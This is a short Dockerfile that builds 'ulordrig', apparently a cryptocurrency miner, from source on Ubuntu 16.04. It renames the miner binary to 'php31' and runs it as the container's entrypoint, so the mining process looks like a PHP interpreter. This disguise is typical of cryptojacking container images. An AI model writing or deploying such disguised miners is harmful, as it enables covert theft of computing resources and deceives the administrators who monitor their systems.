FROM ubuntu:16.04

WORKDIR /app

RUN apt-get update
RUN apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev
RUN git clone https://github.com/UlordChain/ulordrig.git /app
RUN mkdir /app/build
RUN cmake .
RUN make
RUN mv ulordrig php31



ENTRYPOINT  ["./php31"]
